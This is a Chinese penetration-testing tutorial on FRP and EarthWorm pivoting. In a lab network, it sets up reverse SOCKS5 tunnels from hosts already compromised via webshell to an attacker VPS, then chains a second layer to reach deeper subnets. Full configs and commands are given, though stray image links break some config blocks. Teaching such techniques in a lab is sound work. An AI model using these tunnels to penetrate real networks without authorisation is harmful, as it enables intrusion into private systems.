## FRP工具简介
上一节我们介绍了使用MSF建立Socks代理的方法。本节中，我们来看看另一个强大的内网穿透工具——FRP。

![](img/eba600c53ac56cd83a87eb6d1a2fad94_14.png)

![](img/eba600c53ac56cd83a87eb6d1a2fad94_15.png)

FRP是一个高性能的反向代理应用，支持多种协议，常用于内网穿透。它包含两个核心组件：
*   **frps**：服务端，通常部署在具有公网IP的服务器上。
*   **frpc**：客户端，部署在内网需要被访问的机器上。

其核心工作原理是**客户端主动连接服务端，建立隧道，然后通过服务端暴露的端口将流量转发到内网**。

我们的实验环境是一个三层网络结构，模拟了从外网到深层内网的渗透路径。

## 第一层代理：访问`192.168.22.0/24`网段
首先，我们需要建立第一层代理，以便访问`192.168.22.0/24`网段。

![](img/eba600c53ac56cd83a87eb6d1a2fad94_36.png)

### 第一步：在VPS上启动FRP服务端
在具有公网IP的VPS上，我们需要配置并运行FRP服务端。

![](img/eba600c53ac56cd83a87eb6d1a2fad94_37.png)

![](img/eba600c53ac56cd83a87eb6d1a2fad94_39.png)

以下是服务端配置文件 `frps.ini` 的内容：
```ini
[common]
bind_port = 7000
```
*   `bind_port`：指定FRP服务端监听的端口，客户端将连接此端口。

![](img/eba600c53ac56cd83a87eb6d1a2fad94_41.png)

![](img/eba600c53ac56cd83a87eb6d1a2fad94_43.png)

![](img/eba600c53ac56cd83a87eb6d1a2fad94_45.png)

启动服务端：
```bash
./frps -c ./frps.ini
```
执行后，服务端将在VPS上监听7000端口。

![](img/eba600c53ac56cd83a87eb6d1a2fad94_47.png)

![](img/eba600c53ac56cd83a87eb6d1a2fad94_49.png)

![](img/eba600c53ac56cd83a87eb6d1a2fad94_50.png)

### 第二步：在Target-1上传并配置FRP客户端
在已获取Webshell的`Target-1`上，我们需要上传FRP客户端程序并配置。

![](img/eba600c53ac56cd83a87eb6d1a2fad94_52.png)

![](img/eba600c53ac56cd83a87eb6d1a2fad94_54.png)

以下是客户端配置文件 `frpc.ini` 的内容：
```ini
[common]
server_addr = your_vps_ip
server_port = 7000

![](img/eba600c53ac56cd83a87eb6d1a2fad94_56.png)

![](img/eba600c53ac56cd83a87eb6d1a2fad94_57.png)

![](img/eba600c53ac56cd83a87eb6d1a2fad94_59.png)

![](img/eba600c53ac56cd83a87eb6d1a2fad94_61.png)

[socks5_to_22]
type = tcp
plugin = socks5
remote_port = 10088
```
*   `server_addr`：FRP服务端的IP地址（即你的VPS公网IP）。
*   `server_port`：FRP服务端的端口（与`frps.ini`中的`bind_port`一致）。
*   `[socks5_to_22]`：定义一个代理段，名称可自定义。
*   `type`：代理类型，Socks5使用tcp。
*   `plugin`：使用的插件，此处为`socks5`。
*   `remote_port`：在FRP服务端（VPS）上开启的代理端口。我们将通过访问VPS的`10088`端口来使用这个Socks5代理。

![](img/eba600c53ac56cd83a87eb6d1a2fad94_63.png)

![](img/eba600c53ac56cd83a87eb6d1a2fad94_65.png)

给客户端文件赋予执行权限并运行：
```bash
chmod +x frpc
./frpc -c ./frpc.ini
```

![](img/eba600c53ac56cd83a87eb6d1a2fad94_67.png)

![](img/eba600c53ac56cd83a87eb6d1a2fad94_68.png)

### 第三步：验证与使用代理
1.  **验证连接**：在VPS上查看`10088`端口是否处于监听状态。
    ```bash
    netstat -tlnp | grep 10088
    ```
    如果看到`10088`端口被`frps`监听，说明代理通道建立成功。

2.  **配置代理**：在攻击者的渗透测试工具（如Burp Suite、浏览器、Nmap等）中设置代理。
    *   代理类型：Socks5
    *   代理服务器：`your_vps_ip`
    *   代理端口：`10088`

3.  **测试访问**：配置好代理后，尝试访问内网地址`http://192.168.22.22`。如果能够访问，说明第一层代理配置成功。

![](img/eba600c53ac56cd83a87eb6d1a2fad94_70.png)

通过此代理，我们已经可以像访问本地网络一样，对`192.168.22.0/24`网段进行扫描和测试。

## 第二层代理：访问`192.168.33.0/24`网段
在成功渗透`192.168.22.22`（记为`Target-2`）并获取其Webshell后，我们发现它还能访问更深的`192.168.33.0/24`网段。为了访问这个网段，我们需要建立第二层代理。

![](img/eba600c53ac56cd83a87eb6d1a2fad94_86.png)

![](img/eba600c53ac56cd83a87eb6d1a2fad94_87.png)

![](img/eba600c53ac56cd83a87eb6d1a2fad94_89.png)

思路是：**以`Target-1`作为中间节点，运行第二个FRP服务端，让`Target-2`的FRP客户端连接上来，然后在VPS上通过端口转发，将流量逐级传递到`Target-2`**。

![](img/eba600c53ac56cd83a87eb6d1a2fad94_91.png)

![](img/eba600c53ac56cd83a87eb6d1a2fad94_92.png)

![](img/eba600c53ac56cd83a87eb6d1a2fad94_94.png)

以下是建立第二层代理的流程图：

![](img/eba600c53ac56cd83a87eb6d1a2fad94_95.png)

![](img/eba600c53ac56cd83a87eb6d1a2fad94_97.png)

![](img/eba600c53ac56cd83a87eb6d1a2fad94_99.png)

![](img/eba600c53ac56cd83a87eb6d1a2fad94_101.png)

![](img/eba600c53ac56cd83a87eb6d1a2fad94_102.png)

![](img/eba600c53ac56cd83a87eb6d1a2fad94_3.png)

![](img/eba600c53ac56cd83a87eb6d1a2fad94_104.png)

![](img/eba600c53ac56cd83a87eb6d1a2fad94_106.png)

### 第一步：在Target-1上启动第二个FRP服务端
在`Target-1`上，我们需要运行一个新的FRP服务端实例，用于接收来自`Target-2`的连接。

![](img/eba600c53ac56cd83a87eb6d1a2fad94_108.png)

![](img/eba600c53ac56cd83a87eb6d1a2fad94_110.png)

配置文件 `frps_for_33.ini`：
```ini
[common]
bind_port = 7000
```
注意：此服务端监听在`Target-1`的`192.168.2.1`地址上，端口为`7000`（需确保与后续客户端配置一致且端口未被占用）。

![](img/eba600c53ac56cd83a87eb6d1a2fad94_112.png)

启动服务端：
```bash
./frps -c ./frps_for_33.ini
```

### 第二步：在Target-2上配置FRP客户端
在`Target-2` (`192.168.22.22`) 上，配置FRP客户端连接至`Target-1`上的服务端。

![](img/eba600c53ac56cd83a87eb6d1a2fad94_114.png)

![](img/eba600c53ac56cd83a87eb6d1a2fad94_115.png)

配置文件 `frpc_target2.ini`：
```ini
[common]
server_addr = 192.168.2.1
server_port = 7000

![](img/eba600c53ac56cd83a87eb6d1a2fad94_117.png)

[socks5_to_33]
type = tcp
plugin = socks5
remote_port = 10089
```
*   `server_addr`：这里填写`Target-1`的内网IP `192.168.2.1`。
*   `remote_port`：在`Target-1`的FRP服务端上开启的代理端口`10089`。

![](img/eba600c53ac56cd83a87eb6d1a2fad94_119.png)

![](img/eba600c53ac56cd83a87eb6d1a2fad94_120.png)

![](img/eba600c53ac56cd83a87eb6d1a2fad94_122.png)

运行客户端：
```bash
./frpc -c ./frpc_target2.ini
```

![](img/eba600c53ac56cd83a87eb6d1a2fad94_124.png)

### 第三步：在Target-1上配置流量转发
现在，`Target-2`的Socks5代理服务端口`10089`已经映射到了`Target-1`上。我们需要在`Target-1`上，将这个端口再次通过第一层代理转发到我们的公网VPS。

![](img/eba600c53ac56cd83a87eb6d1a2fad94_126.png)

![](img/eba600c53ac56cd83a87eb6d1a2fad94_128.png)

修改`Target-1`上**第一个FRP客户端**的配置文件 `frpc.ini`，增加一个端口转发段：
```ini
[common]
server_addr = your_vps_ip
server_port = 7000

![](img/eba600c53ac56cd83a87eb6d1a2fad94_130.png)

![](img/eba600c53ac56cd83a87eb6d1a2fad94_132.png)

[socks5_to_22]
type = tcp
plugin = socks5
remote_port = 10088

[port_forward_33]
type = tcp
local_ip = 127.0.0.1
local_port = 10089
remote_port = 10090
```
*   `[port_forward_33]`：新增的端口转发段。
*   `local_ip` 和 `local_port`：指定将`Target-1`本地的`10089`端口（即来自`Target-2`的代理）进行转发。
*   `remote_port`：在VPS的FRP服务端上开启的新端口`10090`。**我们将通过访问VPS的`10090`端口来使用第二层Socks5代理**。

重启`Target-1`上的FRP客户端以使配置生效。

![](img/eba600c53ac56cd83a87eb6d1a2fad94_134.png)

![](img/eba600c53ac56cd83a87eb6d1a2fad94_136.png)

![](img/eba600c53ac56cd83a87eb6d1a2fad94_137.png)

![](img/eba600c53ac56cd83a87eb6d1a2fad94_139.png)

### 第四步：使用第二层代理
1.  **验证**：在VPS上检查`10090`端口是否被`frps`监听。
2.  **配置代理**：在攻击者的工具中设置新的代理。
    *   代理类型：Socks5
    *   代理服务器：`your_vps_ip`
    *   代理端口：`10090`
3.  **测试访问**：通过此代理尝试访问`192.168.33.33`等地址，即可对第三层网络进行探测。

## 工具对比：FRP vs EW
除了FRP，EarthWorm (EW) 也是常用的内网穿透工具。它使用更简洁，通常一条命令就能完成代理建立。

![](img/eba600c53ac56cd83a87eb6d1a2fad94_146.png)

![](img/eba600c53ac56cd83a87eb6d1a2fad94_148.png)

以下是EW建立类似二层代理的示例命令思路：
1.  在VPS上运行：`./ew -s rcsocks -l 1080 -e 8888`
2.  在Target-1上运行：`./ew -s rssocks -d vps_ip -e 8888`
3.  在Target-2上运行：`./ew -s ssocksd -l 9999`
4.  在Target-1上使用工具连接Target-2的9999端口，并将流量转发到VPS。

![](img/eba600c53ac56cd83a87eb6d1a2fad94_150.png)

![](img/eba600c53ac56cd83a87eb6d1a2fad94_152.png)

EW的优势是命令简单，但FRP在功能多样性、配置灵活性和稳定性上更胜一筹。掌握两者有助于在不同场景下选择最合适的工具。

## 总结
本节课我们一起学习了FRP工具在多层级网络渗透中的应用。

![](img/eba600c53ac56cd83a87eb6d1a2fad94_163.png)

我们主要掌握了：
1.  **FRP的基本概念**：理解了`frps`（服务端）和`frpc`（客户端）的角色与关系。
2.  **一层代理的建立**：通过将内网机器的Socks5代理映射到公网VPS，实现了对外网不可见内网网段的直接访问。
3.  **多层代理的搭建**：通过在中继机器上部署额外的FRP服务，实现了流量的逐级转发，从而穿透多层网络边界，访问更深层的内网资源。
4.  **核心配置要点**：包括`server_addr`、`remote_port`、`local_port`等关键参数的含义与配置方法。
